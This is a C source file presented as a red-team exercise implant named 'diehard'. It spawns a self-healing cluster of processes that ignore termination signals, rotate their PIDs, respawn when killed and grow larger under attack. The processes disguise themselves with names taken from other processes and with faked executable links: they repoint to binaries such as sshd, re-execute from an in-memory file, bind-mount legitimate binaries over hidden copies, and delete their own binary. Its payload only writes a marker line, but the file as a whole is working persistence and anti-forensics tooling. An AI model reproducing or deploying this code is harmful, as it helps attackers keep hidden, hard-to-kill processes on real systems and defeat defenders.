/*
 * diehard.c — Red Team exercise implant.
 *
 * Build:   gcc -O2 -Wall -Wextra -o diehard diehard.c
 * Run:     ./diehard            (sudo for full cmdline masquerade)
 * Stop:    touch /tmp/diehard.stop
 *
 * Cluster of 4 cooperating processes. Each PID-rotates on a jittered timer
 * and renames itself by sampling a random comm from /proc on every fork.
 *
 * IPC: a single anonymous MAP_SHARED region created in main and inherited
 * by every fork descendant. No /tmp/diehard.lead, no /tmp/diehard.peers/.
 * Leader election is CAS on a shared word with a heartbeat-staleness
 * takeover path. Per-peer slots carry pid + monotonic heartbeat.
 *
 * Single-threaded by design: fork() in a multithreaded process is a deadlock
 * trap (libc lock state is undefined in the child). Poll-based loop with
 * millisecond timers — no threads, no async runtime.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/prctl.h>
#include <time.h>
#include <dirent.h>
#include <errno.h>
#include <limits.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdatomic.h>

#ifndef AT_EMPTY_PATH
#define AT_EMPTY_PATH 0x1000
#endif

#define SENTINEL_PATH       "/tmp/diehard.stop"
#define WORK_FILE           "/tmp/diehard.txt"
#define WORK_LINE           "Welcome to the party, pal.\n"
#define WORK_NEEDLE         "Welcome to the party, pal."

#define CLUSTER_BASE_SIZE   32   /* baseline live members */
#define CLUSTER_THREAT_SIZE 128  /* live members while under attack */
#define CLUSTER_MAX_SIZE    128  /* slot-array bound (>= THREAT_SIZE) */
#define TICK_MS             20
#define HEARTBEAT_MS        80
#define STALE_MS            300
#define ELECTION_RETRY_MS   30
#define MEMBERSHIP_CHECK_MS 30
#define ROTATION_MIN_MS     200
#define ROTATION_MAX_MS     800
#define WORK_BUF_SIZE       16384
#define PID_SPREAD_MIN      30
#define PID_SPREAD_MAX      200

/* Threat mode: triggered when leader's sweep detects ANY slot whose
 * pid is set but heartbeat is stale (i.e., killed externally rather
 * than gracefully exited via release_slot). Under threat we rotate
 * far faster AND grow the live cluster from BASE to THREAT size, so
 * each kill volley is racing more bodies and a ~30 ms snapshot decay. */
#define THREAT_KILLED_THRESHOLD 1
#define THREAT_DURATION_MS      30000
#define ROT_THREAT_MIN_MS       50
#define ROT_THREAT_MAX_MS       200

/* Per-slot rotation bands. Slots 0-7 are fast (defeat per-pid kill loops),
 * 8-15 medium-fast, 16-23 medium-slow, 24-31 slow. Slow-band members keep
 * their start time stable for many minutes, so a `ps aux | grep $MINUTE`
 * filter only catches the fast band — slow members survive and refill the
 * dead ranks. Threat-mode boost applies to the fast band only; the slower
 * bands keep their old start times even under attack. */
#define BAND_SIZE           (CLUSTER_BASE_SIZE / 4)   /* 8 slots per band */
#define ROT_MEDFAST_MIN_MS  5000
#define ROT_MEDFAST_MAX_MS  30000
#define ROT_MEDSLOW_MIN_MS  60000
#define ROT_MEDSLOW_MAX_MS  300000
#define ROT_SLOW_MIN_MS     300000
#define ROT_SLOW_MAX_MS     1800000

struct peer_slot {
    _Atomic pid_t    pid;
    _Atomic uint64_t hb_ms;
};

struct shared_state {
    _Atomic pid_t    leader;
    _Atomic uint64_t leader_hb_ms;
    _Atomic uint64_t threat_until_ms;
    struct peer_slot slots[CLUSTER_MAX_SIZE];
};

static struct shared_state *g_shm        = NULL;
static int                  g_shm_fd     = -1;
static int                  g_slot_idx   = -1;
static bool                 g_is_leader  = false;
static char                *g_argv0      = NULL;
static size_t               g_argv0_len  = 0;

static uint64_t monotonic_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static bool under_threat(void) {
    if (!g_shm) return false;
    uint64_t now = monotonic_ms();
    return now < atomic_load(&g_shm->threat_until_ms);
}

static int target_size_now(void) {
    return under_threat() ? CLUSTER_THREAT_SIZE : CLUSTER_BASE_SIZE;
}

static uint64_t jittered_rotation_ms(void) {
    int slot = g_slot_idx;
    if (slot < 0) slot = 0;

    /* Fast band: slots [0, BAND_SIZE) and all threat-mode extras
     * (slot >= CLUSTER_BASE_SIZE). These are the per-pid-kill defenders. */
    bool fast_band = (slot < BAND_SIZE) || (slot >= CLUSTER_BASE_SIZE);

    if (fast_band) {
        if (under_threat()) {
            return ROT_THREAT_MIN_MS +
                   (rand() % (ROT_THREAT_MAX_MS - ROT_THREAT_MIN_MS + 1));
        }
        return ROTATION_MIN_MS +
               (rand() % (ROTATION_MAX_MS - ROTATION_MIN_MS + 1));
    }
    if (slot < 2 * BAND_SIZE) {
        return ROT_MEDFAST_MIN_MS +
               (rand() % (ROT_MEDFAST_MAX_MS - ROT_MEDFAST_MIN_MS + 1));
    }
    if (slot < 3 * BAND_SIZE) {
        return ROT_MEDSLOW_MIN_MS +
               (rand() % (ROT_MEDSLOW_MAX_MS - ROT_MEDSLOW_MIN_MS + 1));
    }
    return ROT_SLOW_MIN_MS +
           (rand() % (ROT_SLOW_MAX_MS - ROT_SLOW_MIN_MS + 1));
}

static void sleep_ms(int ms) {
    struct timespec ts = { ms / 1000, (long)(ms % 1000) * 1000000L };
    nanosleep(&ts, NULL);
}

static bool sentinel_present(void) {
    return access(SENTINEL_PATH, F_OK) == 0;
}

extern char **environ;

/*
 * Claim the entire contiguous argv+envp block as our cmdline buffer.
 * argv and envp live back-to-back on the stack at exec time. We:
 *   1. Walk to the end of envp to find the block boundary.
 *   2. Move environ to the heap so writing past argv doesn't corrupt env.
 *   3. Tell the kernel arg_end now extends through old envp via PR_SET_MM,
 *      so /proc/<pid>/cmdline (what `ps aux` shows) reads the whole region.
 *
 * Step 3 needs CAP_SYS_RESOURCE; on failure we still own the buffer but
 * cmdline display truncates at the original arg_end.
 */
static void capture_argv(int argc, char **argv) {
    if (!argv || !argv[0]) return;
    g_argv0 = argv[0];

    char *end = argv[0] + strlen(argv[0]) + 1;
    for (int i = 1; i < argc; i++) {
        if (argv[i] == end) end = argv[i] + strlen(argv[i]) + 1;
    }
    for (int i = 0; environ[i]; i++) {
        if (environ[i] == end) end = environ[i] + strlen(environ[i]) + 1;
    }

    int n = 0;
    while (environ[n]) n++;
    char **new_env = malloc((size_t)(n + 1) * sizeof *new_env);
    if (new_env) {
        for (int i = 0; i < n; i++) new_env[i] = strdup(environ[i]);
        new_env[n] = NULL;
        environ = new_env;
    }

    g_argv0_len = (size_t)(end - argv[0]);
    prctl(PR_SET_MM, PR_SET_MM_ARG_END, (unsigned long)end, 0, 0);
}

static bool is_numeric(const char *s) {
    if (!*s) return false;
    for (; *s; s++) if (*s < '0' || *s > '9') return false;
    return true;
}

/*
 * Kernel threads have an empty /proc/<pid>/cmdline; ps shows their comm
 * in brackets. Sampling those names produces obvious fakes (e.g. an
 * `inet_frag_wq` running as a regular user). Filter them out.
 */
static bool is_userland_pid(pid_t pid) {
    char path[64];
    snprintf(path, sizeof path, "/proc/%d/cmdline", (int)pid);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return false;
    char b;
    ssize_t n = read(fd, &b, 1);
    close(fd);
    return n > 0;
}

static bool read_proc_comm(pid_t pid, char *out, size_t outsz) {
    char path[64];
    snprintf(path, sizeof path, "/proc/%d/comm", (int)pid);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return false;
    ssize_t n = read(fd, out, outsz - 1);
    close(fd);
    if (n <= 0) return false;
    out[n] = '\0';
    char *nl = strchr(out, '\n');
    if (nl) *nl = '\0';
    return out[0] != '\0';
}

static void pick_masquerade_name(char *out, size_t outsz) {
    DIR *d = opendir("/proc");
    if (!d) { snprintf(out, outsz, "k%08x", rand()); return; }
    char chosen[16] = {0};
    int seen = 0;
    pid_t self = getpid();
    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        if (!is_numeric(e->d_name)) continue;
        pid_t pid = (pid_t)atoi(e->d_name);
        if (pid == self) continue;
        if (!is_userland_pid(pid)) continue;
        char comm[16];
        if (!read_proc_comm(pid, comm, sizeof comm)) continue;
        if (strstr(comm, "diehard")) continue;
        seen++;
        if (rand() % seen == 0) memcpy(chosen, comm, sizeof chosen);
    }
    closedir(d);
    if (chosen[0]) snprintf(out, outsz, "%s", chosen);
    else           snprintf(out, outsz, "k%08x", rand());
}

static void masquerade(void) {
    char name[16];
    pick_masquerade_name(name, sizeof name);
    prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
    if (g_argv0 && g_argv0_len > 0) {
        memset(g_argv0, 0, g_argv0_len);
        size_t n = strlen(name);
        if (n >= g_argv0_len) n = g_argv0_len - 1;
        memcpy(g_argv0, name, n);
    }
}

/*
 * Backed by a memfd so the fd survives execve and can be passed across
 * re-exec via DIEHARD_SHM_FD. Inherited by every fork descendant. As long
 * as one cluster member stays alive, the region persists.
 *
 * For the very first launch we create the memfd here; for re-exec'd
 * cluster members the env var carries the inherited fd number.
 */
static void shm_init(void) {
    const char *fd_str = getenv("DIEHARD_SHM_FD");
    if (fd_str) {
        g_shm_fd = atoi(fd_str);
        unsetenv("DIEHARD_SHM_FD");
    } else {
        /* Empty memfd name → "/memfd: (deleted)" in /proc/<pid>/maps,
         * indistinguishable from anonymous memfds systemd, snapd, dbus
         * etc. routinely create. No "diehard-shm" string to grep for. */
        g_shm_fd = (int)syscall(SYS_memfd_create, "", 0u);
        if (g_shm_fd < 0) _exit(1);
        if (ftruncate(g_shm_fd, (off_t)sizeof(struct shared_state)) < 0) _exit(1);
    }
    g_shm = mmap(NULL, sizeof *g_shm, PROT_READ | PROT_WRITE,
                 MAP_SHARED, g_shm_fd, 0);
    if (g_shm == MAP_FAILED) _exit(1);
}

static int claim_slot(void) {
    pid_t self = getpid();
    for (int i = 0; i < CLUSTER_MAX_SIZE; i++) {
        pid_t expected = 0;
        if (atomic_compare_exchange_strong(&g_shm->slots[i].pid, &expected, self)) {
            atomic_store(&g_shm->slots[i].hb_ms, monotonic_ms());
            return i;
        }
    }
    return -1;
}

static void release_slot(void) {
    if (g_slot_idx >= 0) {
        atomic_store(&g_shm->slots[g_slot_idx].pid, 0);
    }
    if (g_is_leader) {
        pid_t self = getpid();
        atomic_compare_exchange_strong(&g_shm->leader, &self, 0);
    }
}

/*
 * Two-phase election: claim if leader is empty (CAS 0 → self); otherwise
 * attempt a takeover only if the incumbent's heartbeat is stale.
 */
static bool try_become_leader(void) {
    pid_t self = getpid();
    pid_t expected = 0;
    if (atomic_compare_exchange_strong(&g_shm->leader, &expected, self)) {
        atomic_store(&g_shm->leader_hb_ms, monotonic_ms());
        return true;
    }
    uint64_t now = monotonic_ms();
    uint64_t hb  = atomic_load(&g_shm->leader_hb_ms);
    if (now > hb && now - hb > STALE_MS) {
        pid_t cur = atomic_load(&g_shm->leader);
        if (cur != self &&
            atomic_compare_exchange_strong(&g_shm->leader, &cur, self)) {
            atomic_store(&g_shm->leader_hb_ms, monotonic_ms());
            return true;
        }
    }
    return false;
}

static void heartbeat(void) {
    uint64_t now = monotonic_ms();
    if (g_slot_idx >= 0) {
        atomic_store(&g_shm->slots[g_slot_idx].hb_ms, now);
    }
    if (g_is_leader) {
        atomic_store(&g_shm->leader_hb_ms, now);
    }
}

static void install_signal_handlers(void) {
    signal(SIGTERM, SIG_IGN);
    signal(SIGHUP,  SIG_IGN);
    signal(SIGINT,  SIG_IGN);
    signal(SIGUSR1, SIG_IGN);
    signal(SIGUSR2, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
}

static void ensure_work_line(void) {
    int fd = open(WORK_FILE, O_RDONLY);
    if (fd < 0) {
        if (errno == ENOENT) {
            int wfd = open(WORK_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if (wfd >= 0) {
                (void)!write(wfd, WORK_LINE, strlen(WORK_LINE));
                close(wfd);
            }
        }
        return;
    }
    char buf[WORK_BUF_SIZE];
    size_t total = 0;
    ssize_t n;
    while (total + 1 < sizeof buf &&
           (n = read(fd, buf + total, sizeof(buf) - 1 - total)) > 0) {
        total += (size_t)n;
    }
    buf[total] = '\0';
    close(fd);
    if (strstr(buf, WORK_NEEDLE)) return;
    int wfd = open(WORK_FILE, O_WRONLY | O_APPEND | O_CREAT, 0644);
    if (wfd >= 0) {
        (void)!write(wfd, WORK_LINE, strlen(WORK_LINE));
        close(wfd);
    }
}

/*
 * Exe-link evasion techniques. Each one tries to defeat the "readlink
 * /proc/<pid>/exe | grep diehard" fingerprint. The picker selects one
 * at random from those feasible at the current privilege level. Only
 * applied once at startup; fork descendants inherit the result.
 */

static bool i_am_root(void) { return geteuid() == 0; }

static const char *legit_binaries[] = {
    "/usr/sbin/sshd",
    "/usr/sbin/cron",
    "/usr/sbin/rsyslogd",
    "/usr/lib/systemd/systemd-resolved",
    "/usr/lib/snapd/snapd",
    "/usr/sbin/cupsd",
    "/usr/bin/dbus-daemon",
    "/usr/bin/containerd",
    "/usr/bin/dockerd",
    "/usr/sbin/NetworkManager",
};

static const char *pick_legit_binary(void) {
    int n = (int)(sizeof legit_binaries / sizeof *legit_binaries);
    int order[16];
    for (int i = 0; i < n; i++) order[i] = i;
    for (int i = n - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int t = order[i]; order[i] = order[j]; order[j] = t;
    }
    for (int i = 0; i < n; i++) {
        if (access(legit_binaries[order[i]], R_OK) == 0)
            return legit_binaries[order[i]];
    }
    return NULL;
}

/* PR_SET_MM_EXE_FILE — repoint mm->exe_file to a legit binary. */
static bool tech_repoint(void) {
    if (!i_am_root()) return false;
    const char *path = pick_legit_binary();
    if (!path) return false;
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return false;
    int rc = prctl(PR_SET_MM, PR_SET_MM_EXE_FILE, fd, 0, 0);
    close(fd);
    return rc == 0;
}

/*
 * memfd_create + execveat — copy our binary to an anonymous in-memory fd,
 * exec it. /proc/<pid>/exe becomes /memfd:<rand> (deleted). On success
 * this never returns to the caller; the new process re-enters main and
 * sees DIEHARD_REEXECED to skip the picker.
 */
static bool tech_memfd(char **argv) {
    int src = open("/proc/self/exe", O_RDONLY);
    if (src < 0) return false;
    char fdname[16];
    snprintf(fdname, sizeof fdname, "%08x", rand());
    int memfd = (int)syscall(SYS_memfd_create, fdname, 0u);
    if (memfd < 0) { close(src); return false; }
    char buf[65536];
    ssize_t n;
    while ((n = read(src, buf, sizeof buf)) > 0) {
        ssize_t off = 0;
        while (off < n) {
            ssize_t w = write(memfd, buf + off, (size_t)(n - off));
            if (w <= 0) { close(memfd); close(src); return false; }
            off += w;
        }
    }
    close(src);
    char fd_str[16], slot_str[16];
    snprintf(fd_str, sizeof fd_str, "%d", g_shm_fd);
    snprintf(slot_str, sizeof slot_str, "%d", g_slot_idx);
    setenv("DIEHARD_REEXECED", "1", 1);
    setenv("DIEHARD_SHM_FD", fd_str, 1);
    setenv("DIEHARD_SLOT_IDX", slot_str, 1);
    char *new_argv[2] = { argv && argv[0] ? argv[0] : (char *)"diehard", NULL };
    syscall(SYS_execveat, memfd, "", new_argv, environ, AT_EMPTY_PATH);
    unsetenv("DIEHARD_REEXECED");
    unsetenv("DIEHARD_SHM_FD");
    unsetenv("DIEHARD_SLOT_IDX");
    close(memfd);
    return false;
}

/* Looks like a systemd state-cache file; root-writable; not in /tmp. */
#define BIND_CLEANUP_FILE "/var/lib/.systemd-state-cache"

/*
 * Bind-mount technique: copy ourselves to an innocent throwaway path,
 * re-exec from there with markers in env, then in the re-exec'd process
 * bind-mount a legit binary OVER THE THROWAWAY (not the original
 * binary). After:
 *   - readlink /proc/<pid>/exe → throwaway path (no "diehard" string)
 *   - ls -l <throwaway>          → shows the legit binary (via bind)
 *   - cat /proc/<pid>/exe        → still our bytes (mm->exe_file is
 *                                  pinned to the original inode at exec)
 *
 * The throwaway path is recorded in BIND_CLEANUP_FILE so run.sh can
 * unmount + unlink it on the next launch. Without that cleanup the
 * mount and file persist until reboot.
 */
static bool tech_bind_mount(char **argv) {
    if (!i_am_root()) return false;
    const char *target = pick_legit_binary();
    if (!target) return false;

    /* Spread throwaway paths across multiple plausible dirs and name
     * patterns so a single grep can't enumerate them all. Each dir is
     * checked for writability before use. */
    static const char *dirs[] = {
        "/tmp", "/var/tmp", "/dev/shm", "/run/lock",
        "/var/cache", "/var/lib", "/run/user", "/run",
    };
    static const char *prefixes[] = {
        ".",            /* hidden file */
        ".X11-unix-",   /* mimics X11 socket dir entries */
        ".cache-",
        ".systemd-",
        "lock-",
        "session-",
    };
    char path[PATH_MAX];
    int dn = (int)(sizeof dirs / sizeof *dirs);
    int pn = (int)(sizeof prefixes / sizeof *prefixes);
    /* Try up to dn dirs in random order until one is writable. */
    int order[16];
    for (int i = 0; i < dn; i++) order[i] = i;
    for (int i = dn - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int t = order[i]; order[i] = order[j]; order[j] = t;
    }
    const char *dir = NULL;
    for (int i = 0; i < dn; i++) {
        if (access(dirs[order[i]], W_OK) == 0) { dir = dirs[order[i]]; break; }
    }
    if (!dir) dir = "/tmp";
    const char *prefix = prefixes[rand() % pn];
    snprintf(path, sizeof path, "%s/%s%08x%08x", dir, prefix, rand(), rand());

    int src = open("/proc/self/exe", O_RDONLY);
    if (src < 0) return false;
    int dst = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
    if (dst < 0) { close(src); return false; }
    char buf[65536];
    ssize_t n;
    while ((n = read(src, buf, sizeof buf)) > 0) {
        ssize_t off = 0;
        while (off < n) {
            ssize_t w = write(dst, buf + off, (size_t)(n - off));
            if (w <= 0) { close(dst); close(src); unlink(path); return false; }
            off += w;
        }
    }
    close(src);
    close(dst);

    char fd_str[16], slot_str[16];
    snprintf(fd_str, sizeof fd_str, "%d", g_shm_fd);
    snprintf(slot_str, sizeof slot_str, "%d", g_slot_idx);
    setenv("DIEHARD_REEXECED", "1", 1);
    setenv("DIEHARD_SHM_FD", fd_str, 1);
    setenv("DIEHARD_SLOT_IDX", slot_str, 1);
    setenv("DIEHARD_BIND_TARGET", target, 1);
    setenv("DIEHARD_BIND_PATH", path, 1);
    char *new_argv[2] = { argv && argv[0] ? argv[0] : (char *)"diehard", NULL };
    execve(path, new_argv, environ);
    /* exec failed */
    unsetenv("DIEHARD_REEXECED");
    unsetenv("DIEHARD_SHM_FD");
    unsetenv("DIEHARD_SLOT_IDX");
    unsetenv("DIEHARD_BIND_TARGET");
    unsetenv("DIEHARD_BIND_PATH");
    unlink(path);
    return false;
}

/*
 * Unlink the on-disk binary. Conspicuous: exe link becomes
 * "<path> (deleted)". Pair with run.sh to rebuild between runs.
 */
static bool tech_delete(void) {
    char path[PATH_MAX];
    ssize_t n = readlink("/proc/self/exe", path, sizeof path - 1);
    if (n <= 0) return false;
    path[n] = '\0';
    return unlink(path) == 0;
}

typedef bool (*tech_fn)(char **argv);
static bool t_repoint(char **argv)    { (void)argv; return tech_repoint(); }
static bool t_memfd(char **argv)      { return tech_memfd(argv); }
static bool t_bind_mount(char **argv) { return tech_bind_mount(argv); }
static bool t_delete(char **argv)     { (void)argv; return tech_delete(); }

/*
 * On re-exec the new process re-enters main and lands here with
 * DIEHARD_REEXECED set. If DIEHARD_BIND_PATH is also set, we're
 * coming from tech_bind_mount and need to apply the bind-mount now
 * (the original process couldn't, since it would replace its own
 * exec image before the cluster forks). Record the path so run.sh
 * can clean up on the next launch.
 */
static void finalize_reexec(void) {
    const char *target = getenv("DIEHARD_BIND_TARGET");
    const char *path   = getenv("DIEHARD_BIND_PATH");
    if (target && path) {
        if (mount(target, path, NULL, MS_BIND, NULL) == 0) {
            int fd = open(BIND_CLEANUP_FILE,
                          O_WRONLY | O_APPEND | O_CREAT, 0644);
            if (fd >= 0) {
                char line[PATH_MAX + 2];
                int n = snprintf(line, sizeof line, "%s\n", path);
                if (n > 0) (void)!write(fd, line, (size_t)n);
                close(fd);
            }
        }
    }
    unsetenv("DIEHARD_REEXECED");
    unsetenv("DIEHARD_BIND_TARGET");
    unsetenv("DIEHARD_BIND_PATH");
}

static void apply_random_evasion(char **argv) {
    tech_fn pool[4];
    int n = 0;
    if (i_am_root()) pool[n++] = t_repoint;
    pool[n++] = t_memfd;
    if (i_am_root()) pool[n++] = t_bind_mount;
    pool[n++] = t_delete;
    for (int i = n - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        tech_fn t = pool[i]; pool[i] = pool[j]; pool[j] = t;
    }
    for (int i = 0; i < n; i++) {
        if (pool[i](argv)) return;
    }
}

static void member_loop(void);

/*
 * Consume a random number of PIDs by forking throwaway children that
 * immediately exit. Spreads the initial cluster across the PID space so
 * members aren't adjacent in `ps aux`. Caller must have SIGCHLD ignored
 * (or otherwise reaping) so the zombies don't pile up.
 */
static void burn_pids(int n) {
    for (int i = 0; i < n; i++) {
        pid_t p = fork();
        if (p < 0) return;
        if (p == 0) _exit(0);
    }
}

static void spawn_replacement(void) {
    pid_t pid = fork();
    if (pid < 0) return;
    if (pid == 0) {
        g_is_leader = false;
        setpgid(0, 0);
        srand((unsigned)(monotonic_ms() ^ getpid()));
        masquerade();
        g_slot_idx = claim_slot();
        if (g_slot_idx < 0) _exit(0);
        apply_random_evasion(NULL);
        install_signal_handlers();
        g_is_leader = try_become_leader();
        member_loop();
        _exit(0);
    }
}

static void maintain_membership(void) {
    uint64_t now = monotonic_ms();
    int alive = 0;
    int killed = 0;
    for (int i = 0; i < CLUSTER_MAX_SIZE; i++) {
        pid_t pid = atomic_load(&g_shm->slots[i].pid);
        if (pid == 0) continue;
        uint64_t hb = atomic_load(&g_shm->slots[i].hb_ms);
        if (now > hb && now - hb > STALE_MS) {
            atomic_store(&g_shm->slots[i].pid, 0);
            killed++;
        } else {
            alive++;
        }
    }
    if (killed >= THREAT_KILLED_THRESHOLD) {
        atomic_store(&g_shm->threat_until_ms, now + THREAT_DURATION_MS);
    }
    int target = target_size_now();
    int missing = target - alive;
    for (int i = 0; i < missing; i++) spawn_replacement();
}

/*
 * PID rotation: parent forks, child takes over the same slot index, parent
 * exits. Slot transfer is atomic-store-of-new-pid. Leadership transfer is
 * a CAS from old_pid → new_pid; if it loses (someone else just took over),
 * the new child is a follower — system self-heals.
 */
static void rotate_self(void) {
    pid_t old_pid = getpid();
    pid_t pid = fork();
    if (pid < 0) return;
    if (pid == 0) {
        setpgid(0, 0);
        srand((unsigned)(monotonic_ms() ^ getpid()));
        masquerade();
        if (g_slot_idx >= 0) {
            atomic_store(&g_shm->slots[g_slot_idx].pid, getpid());
            atomic_store(&g_shm->slots[g_slot_idx].hb_ms, monotonic_ms());
        }
        if (g_is_leader) {
            pid_t expected = old_pid;
            if (!atomic_compare_exchange_strong(&g_shm->leader,
                                                &expected, getpid())) {
                g_is_leader = false;
            } else {
                atomic_store(&g_shm->leader_hb_ms, monotonic_ms());
            }
        }
        return;
    }
    _exit(0);
}

static void graceful_exit(void) {
    release_slot();
    _exit(0);
}

static void member_loop(void) {
    uint64_t now = monotonic_ms();
    uint64_t next_heartbeat  = now + HEARTBEAT_MS;
    uint64_t next_election   = now + ELECTION_RETRY_MS;
    uint64_t next_membership = now + MEMBERSHIP_CHECK_MS;
    uint64_t next_rotation   = now + jittered_rotation_ms();

    for (;;) {
        if (sentinel_present()) graceful_exit();

        now = monotonic_ms();

        if (now >= next_heartbeat) {
            heartbeat();
            next_heartbeat = now + HEARTBEAT_MS;
        }

        if (!g_is_leader && now >= next_election) {
            if (try_become_leader()) g_is_leader = true;
            next_election = now + ELECTION_RETRY_MS;
        }

        if (g_is_leader) {
            ensure_work_line();
            if (now >= next_membership) {
                maintain_membership();
                next_membership = now + MEMBERSHIP_CHECK_MS;
            }
        }

        if (now >= next_rotation) {
            rotate_self();
            next_rotation = monotonic_ms() + jittered_rotation_ms();
        }

        sleep_ms(TICK_MS);
    }
}

/*
 * Re-exec'd cluster member entry: a child that picked tech_memfd or
 * tech_bind_mount post-fork called execve, which lands us back at main
 * with DIEHARD_REEXECED set. We've already inherited the shm fd and our
 * slot index via env vars; just resume the member loop. PID is preserved
 * across exec so the slot's pid field is still valid; leadership is
 * recovered by checking whether shm->leader still points at us.
 */
static void run_reexec_member(void) {
    finalize_reexec();
    const char *slot_str = getenv("DIEHARD_SLOT_IDX");
    g_slot_idx = slot_str ? atoi(slot_str) : -1;
    unsetenv("DIEHARD_SLOT_IDX");
    if (g_slot_idx < 0 || g_slot_idx >= CLUSTER_MAX_SIZE) _exit(0);
    masquerade();
    atomic_store(&g_shm->slots[g_slot_idx].hb_ms, monotonic_ms());
    install_signal_handlers();
    g_is_leader = (atomic_load(&g_shm->leader) == getpid());
    member_loop();
    _exit(0);
}

int main(int argc, char **argv) {
    /* Detach cwd from the launch directory so /proc/<pid>/cwd doesn't
     * point at the diehard project. Inherited across fork and exec. */
    (void)!chdir("/");
    srand((unsigned)(monotonic_ms() ^ getpid()));
    capture_argv(argc, argv);
    shm_init();

    if (getenv("DIEHARD_REEXECED")) {
        run_reexec_member();
    }

    signal(SIGCHLD, SIG_IGN);

    for (int i = 0; i < CLUSTER_BASE_SIZE; i++) {
        if (i > 0) {
            burn_pids(PID_SPREAD_MIN +
                      (rand() % (PID_SPREAD_MAX - PID_SPREAD_MIN + 1)));
        }
        pid_t pid = fork();
        if (pid < 0) _exit(1);
        if (pid == 0) {
            setpgid(0, 0);
            srand((unsigned)(monotonic_ms() ^ getpid()));
            masquerade();
            g_slot_idx = claim_slot();
            if (g_slot_idx < 0) _exit(0);
            apply_random_evasion(argv);
            install_signal_handlers();
            g_is_leader = try_become_leader();
            member_loop();
            _exit(0);
        }
    }
    _exit(0);
}
